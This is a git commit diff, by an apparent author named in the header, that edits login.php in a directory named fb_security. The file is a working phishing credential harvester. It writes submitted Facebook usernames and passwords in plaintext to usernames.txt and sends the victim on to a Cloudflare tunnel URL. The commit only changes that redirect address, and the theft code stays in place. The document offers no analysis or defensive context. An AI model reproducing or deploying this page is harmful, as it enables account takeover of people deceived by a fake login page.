c9db696465aba8ca1d80c299376df3bbdbd62265
Mahfuz <11mahfuzrahman148@gmail.com>
2022-04-18 20:40:16 +0600

    hhh

--- .sites/fb_security/login.php
+++ .sites/fb_security/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://twin-successful-hopefully-distinguished.trycloudflare.com');
+header('Location: https://october-lean-editorials-fabrics.trycloudflare.com');
 exit();
 ?>
